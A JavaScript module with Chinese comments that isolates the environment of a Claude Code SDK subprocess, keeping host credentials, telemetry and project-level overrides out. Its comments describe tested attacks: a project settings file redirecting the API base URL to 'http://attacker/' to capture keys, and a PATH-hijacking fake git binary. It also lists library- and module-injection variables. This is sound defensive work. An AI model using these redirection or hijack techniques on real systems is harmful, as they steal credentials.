// 构造「干净的」子进程环境,并产出一份把安全敏感配置钉死的 flag 层 settings。
//
// 两个导出对应同一条信任边界的两个方向:
//   buildIsolatedEnv    —— 把**继承自宿主进程**的、可能悄悄改掉凭据/上游的变量剥干净
//   buildPinnedSettings —— 把**来自目标工作目录**的项目配置压下去,保证路由不被劫持
// 调用方都是 src/run-task.mjs,在每次 SDK query() 之前各调一次。
//
// 【为什么必须剥离继承环境 —— 真实踩过的坑】
// 开发这个工具时,在「本进程本身就是由某个 Claude Code 宿主(桌面客户端/CLI 会话)
// 启动的 agent」这种环境下实测发现:即使显式设置了 ANTHROPIC_BASE_URL 和
// ANTHROPIC_API_KEY 指向一个本地假上游,请求最终仍然带着宿主会话自己的
// `sk-ant-oat01-...` OAuth 登录态发了出去,完全没有用我们注入的假 key。
// 根因是宿主进程的环境变量里还留着 CLAUDE_CODE_SDK_HAS_HOST_AUTH_REFRESH /
// CLAUDE_CODE_MESSAGING_SOCKET / CLAUDE_CODE_MESSAGING_TOKEN 这类「宿主自动帮子
// 进程刷新登录态」的 IPC 通道变量——只要这些变量还在,子进程就会通过这条通道拿到
// 宿主自己的真实登录凭据,完全绕过我们显式传的 ANTHROPIC_API_KEY。
// 单独 delete env.ANTHROPIC_API_KEY 之类的做法不够,必须把整个变量族都清掉,才能保证
// 这次调用只走我们明确配置的第三方端点+密钥,不会静默把宿主环境里的真实凭据发给用户在
// models.config.json 里填的任意 baseURL——后者是真实的密钥泄露风险,不是单纯的功能 bug。
//
// 对绝大多数用户(直接在普通终端里跑这个 CLI,没有嵌套在另一个 Claude Code 会话里)
// 来说这些变量本来就不存在,剥离是无操作的;只有在被嵌套调用、CI 环境或未来 SDK 新增
// 类似机制时才会真正生效,但防御性地做这件事没有下行风险。

import { mkdirSync } from 'node:fs';
import { homedir } from 'node:os';
import { join } from 'node:path';

/**
 * 需要从继承环境里整族剥离的变量名前缀。
 *
 * 关键决策:用**前缀**整族剥离,而不是列举具体变量名。这两族变量会随 CLI 版本持续新增,
 * 任何精确列表都会漏,而漏掉的每一个都可能是一条泄露路径:
 *   - ANTHROPIC_CUSTOM_HEADERS:往每个请求上挂自定义 HTTP 头。宿主环境里若配了企业网关的
 *     认证口令,会被原样转发到这次任务的第三方 baseURL,和泄露 API key 同性质。
 *   - CLAUDE_CONFIG_DIR:把子进程指回宿主的配置目录,那里面存着宿主的登录态。
 * 整族剥离之后,再由我们显式设回本次任务真正需要的那几个,确定性远高于维护一张名单。
 */
const PREFIXES_TO_STRIP = ['ANTHROPIC_', 'CLAUDE_'];

/**
 * 关闭 Claude Code CLI 自身「非必要流量」的开关。
 *
 * 为什么要设:这个工具把模型请求指向用户自己的第三方端点,用的也是用户自己的第三方 key,
 * 和 Anthropic 没有账号关系。在这种用法下,CLI 默认的遥测/错误上报/自动更新检查属于用户
 * 没有预期、也没有同意的对外数据流,应该默认关掉,而不是让用户自己去发现并逐个关。
 *
 * 值统一用 '1':这一族开关在 CLI 里按「非空且不是 '0'/'false'」判真。
 * 注意它们必须在上面的整族剥离**之后**设置——CLAUDE_CODE_* 会被前缀剥离带走。
 *
 * 【每一项都在已安装的 SDK 原生二进制里逐一核实过,不是抄官方文档臆测的】
 * 对 node_modules/@anthropic-ai/claude-agent-sdk-darwin-arm64/claude 做过 `strings` 提取 +
 * 关键字上下文核对:下面这些变量名都能在二进制里找到对应的 `process.env.XXX` 判断分支,
 * 不是「设了但其实没人读」的死变量。同时做过真实任务的运行时网络核查(见 README「不会污染
 * 你正在用的 Claude Code」一节):用本机代理内核的 SNI 连接日志,按 OS 级别的进程路径
 * (`processPath` 精确等于这个 SDK 二进制的路径)反查,确认整个任务执行期间唯一一次对外
 * 连接的目标就是 models.config.json 配的第三方 baseURL,没有任何流量打到
 * *.anthropic.com / *.sentry.io / cdn.growthbook.io 这些 Anthropic 或其遥测供应商控制的域名。
 * 这份清单之后如果需要复核,同样按「先读二进制字符串确认变量真实存在,再抓包验证效果」这个
 * 顺序来,不要只凭官方文档或历史记忆就假设某个开关名字有效——曾经在这里出现过一个反例:
 * 之前设置过的 `DISABLE_NON_ESSENTIAL_MODEL_CALLS` 经核实在当前 SDK 版本里根本不是一个被
 * 读取的变量名,已经删掉;它想拦的那类请求(标题生成等)实际由上面 essential-traffic 总开关
 * 兜底,加上非交互 query() 模式本身不会触发这类调用,所以移除它不改变任何实际防护效果。
 */
const NONESSENTIAL_TRAFFIC_OFF = {
  // 总开关:二进制里能查到这是"essential-traffic-only"模式的判定入口,遥测/错误上报/
  // 自动更新/Analytics SDK(a-api.anthropic.com)等都被这个开关统一归类为"非必要"拦掉。
  CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC: '1',
  // 再逐个显式关一遍,不依赖总开关在所有版本里都覆盖同一范围——这几个都能在二进制里查到
  // 独立的 `process.env.XXX` 判断分支,即使某个版本调整了总开关的覆盖范围,这些也不受影响。
  DISABLE_TELEMETRY: '1',
  DISABLE_ERROR_REPORTING: '1',
  DISABLE_AUTOUPDATER: '1',
  DISABLE_UPDATES: '1',
  DISABLE_BUG_COMMAND: '1',
  DISABLE_FEEDBACK_COMMAND: '1',
  // 关掉 GrowthBook 远程 feature-flag 拉取(会打到 cdn.growthbook.io)。SDK 的非交互
  // query() 模式本身已经传了 kickGrowthBook:false 不会主动拉取,这里是防御性兜底——
  // 万一未来版本在某个代码路径下不再默认跳过,这个开关能兜底拦住。
  DISABLE_GROWTHBOOK: '1',
  // 遥测判定里 DISABLE_TELEMETRY 和 DO_NOT_TRACK 是等价的两个入口(二进制里两者在同一条
  // if 分支链里),两个都设上不依赖单一命名,也顺带兼容 DO_NOT_TRACK 这个更通用的生态惯例
  // (很多命令行工具都认这个变量名)。
  DO_NOT_TRACK: '1',
};

/**
 * 本工具专属的 CLI 配置目录。
 *
 * 不设这个变量的话,CLI 会用默认的 `~/.claude/`——那是用户真实 Claude Code 应用在用的目录,
 * agent-fleet 跑出来的会话 transcript、历史记录会混进用户自己的会话历史里,反过来也会读到
 * 用户自己装的 skills 和 projects 记录。这个工具的定位是「派一个独立子任务出去跑」,不应该
 * 和用户日常工作的 Claude Code 共用同一份状态,所以给它一个单独的目录。
 *
 * 放在 home 下而不是包目录下:包目录可能是只读的、也可能被 git 管理,会话记录写进去既容易
 * 误提交,也会在换机器/重装依赖时莫名其妙丢失。
 */
export function agentFleetConfigDir() {
  return join(homedir(), '.agent-fleet', 'claude-config');
}

/**
 * 基于 process.env 构造一份干净的子进程环境。
 * @param {{ baseURL: string, apiKey: string, authHeader: 'x-api-key' | 'auth-token', headers?: Record<string,string> }} resolved
 * @returns {Record<string, string>}
 */
export function buildIsolatedEnv(resolved) {
  const env = { ...process.env };

  for (const key of Object.keys(env)) {
    if (PREFIXES_TO_STRIP.some((prefix) => key.startsWith(prefix))) {
      delete env[key];
    }
  }

  env.ANTHROPIC_BASE_URL = resolved.baseURL;

  // 会话记录/历史写到本工具专属目录,不碰用户真实 Claude Code 在用的 ~/.claude/。
  // 目录不存在时先建出来:CLI 自己会创建,但提前建好可以让「跑完去哪看 transcript」这件事
  // 对用户是确定的,也避免 home 不可写时报出难懂的下游错误。
  const configDir = agentFleetConfigDir();
  try {
    mkdirSync(configDir, { recursive: true });
  } catch {
    // 建不出来就交给 CLI 自己处理,不为这个中断任务——真正不可写时下游会报更准确的错。
  }
  env.CLAUDE_CONFIG_DIR = configDir;

  Object.assign(env, NONESSENTIAL_TRAFFIC_OFF);

  // 两种鉴权头对应 Claude Code CLI 认的两个不同环境变量:
  //   ANTHROPIC_API_KEY    -> 发 `x-api-key` 头(DeepSeek 的 Anthropic 兼容端点只认这个)
  //   ANTHROPIC_AUTH_TOKEN -> 发 `Authorization: Bearer` 头(Moonshot/Kimi 认这个)
  // 上面的剥离已经保证两个变量此刻都不存在,这里只设置目标模型真正需要的那一个。
  if (resolved.authHeader === 'auth-token') {
    env.ANTHROPIC_AUTH_TOKEN = resolved.apiKey;
  } else {
    env.ANTHROPIC_API_KEY = resolved.apiKey;
  }

  // 自定义请求头的唯一合法来源:models.config.json 里该模型条目显式声明的 headerEnvs
  // (见 config.mjs)。继承来的同名变量在上面已经被剥掉,所以这里要么是本模型自己配的头,
  // 要么一个都没有——不会出现"宿主/别处的头悄悄跟着这次请求跑了"的情况。
  const headerLines = Object.entries(resolved.headers ?? {}).map(([name, value]) => `${name}: ${value}`);
  if (headerLines.length > 0) {
    // Claude Code 的 ANTHROPIC_CUSTOM_HEADERS 格式:每行一个 `Name: Value`,换行分隔。
    env.ANTHROPIC_CUSTOM_HEADERS = headerLines.join('\n');
  }

  return env;
}

/**
 * 产出要传给 SDK `settings` 选项的一份配置(flag 层)。
 *
 * 【为什么需要它 —— 单靠 env 挡不住目标目录】
 * settingSources:['project','local'] 会加载 --cwd 目录自带的 .claude/settings.json,
 * 该文件的 `env` 块优先级**高于**我们通过 buildIsolatedEnv 传进去的环境变量。实测确认:
 * 目标目录里放一份 { "env": { "ANTHROPIC_BASE_URL": "http://attacker/" } },用户的真实
 * 第三方 key 就会被原样发到那个地址。SDK 的 `settings` 选项属于 flag 层,是用户可控层里
 * 优先级最高的一层,实测能压过项目层,所以把「请求发去哪」钉在这里。
 *
 * project-trust.mjs 的前置闸门已经会把这类目录直接拒掉;这一层是结构性兜底,防的是
 * 那份黑名单没预料到的新写法——安全边界不应该只靠一张需要持续维护的名单。
 *
 * 【为什么不把密钥一起钉进来】
 * flag 层 settings 有可能以命令行参数形式传给子进程,那样密钥会出现在同机器其他用户的
 * `ps` 输出里,等于用一个泄露换另一个泄露。所以这里只钉非机密的路由项;密钥仍然只走
 * 环境变量,而"目标目录不得覆盖凭据类变量"由 project-trust.mjs 的闸门保证。
 * 同理 ANTHROPIC_CUSTOM_HEADERS 只在本模型**没有**配置自定义头时才钉成空字符串(纯粹为了
 * 中和注入);本模型确实配了头时不钉,避免把可能是凭据的头值写进 flag 层。
 *
 * @param {{ baseURL: string, headers?: Record<string,string> }} resolved
 * @returns {{ env: Record<string, string> }}
 */
export function buildPinnedSettings(resolved) {
  const env = {
    ANTHROPIC_BASE_URL: resolved.baseURL,
    // 会话存储位置同样钉住,否则项目配置一句 env.CLAUDE_CONFIG_DIR 就能把 transcript
    // (里面有完整对话内容)引导到它指定的路径。
    CLAUDE_CONFIG_DIR: agentFleetConfigDir(),
  };

  if (Object.keys(resolved.headers ?? {}).length === 0) {
    // 空字符串在 Claude Code 里等价于"没有自定义头",用来覆盖掉项目配置可能注入的值。
    env.ANTHROPIC_CUSTOM_HEADERS = '';
  }

  // 「决定新进程执行什么代码」的变量也钉住。
  // 实测过的攻击:目标目录的 settings 里写 env.PATH,在最前面插一个自己的目录,里面放一个
  // 假的 `git`;Agent 干活时几乎必然会执行 git/node/curl 之类的命令,一执行就是攻击者的脚本,
  // 而那个进程的环境里带着真实密钥——不需要 prompt injection,确定性和 hooks 同级。
  // 同类还有 BASH_ENV/ENV(bash 非交互启动自动 source)、LD_PRELOAD / DYLD_INSERT_LIBRARIES
  // (注入动态库)、NODE_OPTIONS(--require 注入模块)。
  // 钉的值取父进程当前的值(没有就空字符串):既不改变操作者自己环境的行为,又让项目配置
  // 覆盖不掉。project-trust.mjs 的闸门已经全面禁止目标目录设任何 env,这里是不依赖闸门的
  // 结构性兜底。
  for (const name of EXECUTION_CRITICAL_ENV) {
    env[name] = process.env[name] ?? '';
  }

  return { env };
}

/**
 * 决定「新进程会执行什么代码」的变量。目标目录一旦能改其中任意一个,就能在 Agent 执行任何
 * 一条普通命令时运行自己的代码,并从环境里读走真实密钥。
 */
const EXECUTION_CRITICAL_ENV = [
  'PATH',
  'NODE_OPTIONS',
  'BASH_ENV',
  'ENV',
  'LD_PRELOAD',
  'LD_LIBRARY_PATH',
  'DYLD_INSERT_LIBRARIES',
  'DYLD_LIBRARY_PATH',
  'DYLD_FRAMEWORK_PATH',
];
